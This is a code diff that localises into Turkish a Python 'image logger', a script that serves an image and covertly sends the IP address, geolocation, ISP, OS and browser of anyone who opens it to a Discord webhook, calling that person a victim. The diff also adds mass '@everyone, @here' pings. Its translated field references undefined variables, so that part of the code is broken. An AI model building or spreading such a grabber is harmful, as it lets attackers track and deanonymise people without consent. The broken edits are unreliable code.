@@ -2,31 +2,31 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'Webhook'
-bindata = requests.get('Fotoğraf').content
+webhook = 'Webhookunuzu Buraya KOYUN!'
+bindata = requests.get('Fotoğraf.').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
   "username": "Animnodes",
-  "content": "@everyone",
+  "content": "@everyone , @here",
   "embeds": [
     {
       "title": "Anim IMAGELOGGERl !",
       "color": 16711803,
-      "description": "A Victim opened the original Image. You can find their info below.",
+      "description": "Bir, kurban linkinizi açtı, aşşağıdan bilgileri görebilirsiniz. (anim)",
       "author": {
         "name": "Anim"
       },
       "fields": [
         {
-          "name": "IP Info",
-          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
+          "name": "IP Bilgileri",
+          "value": f"**IP:** `{ip}`\n**City:** `{Şehir}`\n**Region:** `{Irk}`\n**Country:** `{Ülke}`\n**Location:** `{Konum}`\n**ORG:** `{Zip}`\n**ZIP:** `{postal}`",
           "inline": True
         },
         {
-          "name": "Advanced Info",
+          "name": "Daha Fazla Detaylandırma",
           "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
           "inline": False
         }
@@ -38,7 +38,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 def prev(ip,uag):
   return {
   "username": "Anim",
-  "content": "",
+  "content": "@everyone , @here",
   "embeds": [
     {
       "title": "ÖNEMLI !",
